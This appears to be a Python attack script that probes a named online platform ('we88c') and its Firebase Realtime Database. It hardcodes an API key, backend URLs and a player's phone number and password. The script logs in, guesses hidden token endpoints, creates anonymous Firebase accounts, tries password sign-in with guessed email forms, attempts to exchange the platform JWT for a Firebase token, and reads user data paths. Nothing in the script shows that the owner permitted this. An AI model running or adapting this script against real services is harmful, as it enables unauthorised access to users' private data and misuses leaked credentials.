#!/usr/bin/env python3
"""probe_rtdb_we88c.py — Check Firebase RTDB for we88c tenant."""
import json
import requests
import asyncio
import websockets

# we88c Firebase config
API_KEY = "AIzaSyAI5j8kaGDUcUDE5ZMk9Um4CneqEx-4q-s"
RTDB_URL = "https://we88zz-default-rtdb.asia-southeast1.firebasedatabase.app"
TID = "54ef7626cb381f4bab8be91f0cdbce47"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"

# we88c player
PHONE = "0972571110"
PASS = "Pwned2026!"

print("=== we88c Firebase RTDB Probe ===")

# 1. Get platform JWT
print("\n1. Getting platform JWT...")
r = requests.post(f"{PBAPI}/pb/authentication",
    headers={"Content-Type": "application/json"},
    json={"strategy": "local", "username": PHONE, "password": PASS},
    timeout=15)

if r.status_code not in (200, 201):
    print(f"Auth failed: {r.status_code}")
    exit(1)

auth_data = r.json()
platform_jwt = auth_data.get("accessToken")
player_id = auth_data.get("id")
print(f"  Player ID: {player_id}")

# 2. Try to get Firebase custom token from platform
print("\n2. Looking for Firebase token endpoints...")
endpoints = [
    "/pb/firebase-token",
    "/pb/custom-token",
    "/pb/auth-token",
    "/mb/firebase-token",
    "/mb/custom-token",
]

for ep in endpoints:
    url = f"https://{TID}{'pbapi' if '/pb/' in ep else 'mgapi'}.asdgapicenterssdo.com{ep}"
    r = requests.get(url, headers={"Authorization": f"Bearer {platform_jwt}"}, timeout=10)
    if r.status_code != 404:
        print(f"  {ep}: {r.status_code}")
        if r.ok:
            print(f"    {r.text[:200]}")

# 3. Try anonymous auth to Firebase
print("\n3. Trying Firebase anonymous auth...")
url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={API_KEY}"
r = requests.post(url, json={"returnSecureToken": True}, timeout=15)
if r.ok:
    data = r.json()
    anon_token = data.get("idToken")
    anon_uid = data.get("localId")
    print(f"  Anonymous UID: {anon_uid}")
    print(f"  ID Token: {anon_token[:60] if anon_token else 'None'}...")

    # Try RTDB with anonymous token
    if anon_token:
        print("\n4. Probing RTDB with anonymous token...")
        paths = ["/", "/users", "/config", "/public", f"/users/{player_id}"]
        for path in paths:
            url = f"{RTDB_URL}{path}.json?auth={anon_token}&shallow=true"
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                if data:
                    print(f"  [DATA] {path}: {json.dumps(data)[:200]}")
                else:
                    print(f"  [NULL] {path}")
            elif "Permission denied" in r.text:
                print(f"  [DENIED] {path}")
            else:
                print(f"  [{r.status_code}] {path}")
else:
    print(f"  Anonymous auth failed: {r.status_code}")
    print(f"    {r.text[:200]}")

# 4. Try signIn with email/password (convert phone to email format)
print("\n5. Trying email/password Firebase auth...")
url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
for email in [f"{PHONE}@we88c.com", f"{PHONE}@we88z.com", PHONE, f"player_{PHONE}@we88c.com"]:
    r = requests.post(url, json={
        "email": email,
        "password": PASS,
        "returnSecureToken": True
    }, timeout=10)
    if r.ok:
        data = r.json()
        print(f"  [{email}] SUCCESS!")
        print(f"    UID: {data.get('localId')}")
        print(f"    Token: {data.get('idToken', '')[:60]}...")

        # Probe RTDB
        id_token = data.get("idToken")
        if id_token:
            print("\n  Probing RTDB...")
            for path in ["/", f"/users/{data.get('localId')}", f"/users/{player_id}"]:
                url = f"{RTDB_URL}{path}.json?auth={id_token}&shallow=true"
                r2 = requests.get(url, timeout=10)
                print(f"    {path}: {r2.status_code}")
                if r2.ok and r2.json():
                    print(f"      {json.dumps(r2.json())[:200]}")
    else:
        pass  # Skip failed attempts silently

# 5. Try custom token auth (if platform provides it)
print("\n6. Checking if platform JWT can be exchanged for Firebase token...")
url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key={API_KEY}"
r = requests.post(url, json={
    "token": platform_jwt,
    "returnSecureToken": True
}, timeout=15)
if r.ok:
    data = r.json()
    print(f"  Success! Firebase UID: {data.get('localId')}")
    fb_token = data.get("idToken")
    if fb_token:
        print(f"  Probing RTDB with exchanged token...")
        for path in ["/", f"/users/{player_id}"]:
            url = f"{RTDB_URL}{path}.json?auth={fb_token}&shallow=true"
            r2 = requests.get(url, timeout=10)
            print(f"    {path}: {r2.status_code}")
            if r2.ok and r2.json():
                print(f"      {json.dumps(r2.json())[:200]}")
else:
    print(f"  Exchange failed: {r.status_code}")
    if "INVALID_CUSTOM_TOKEN" in r.text:
        print(f"    Platform JWT is not a valid Firebase custom token")

print("\n=== Done ===")
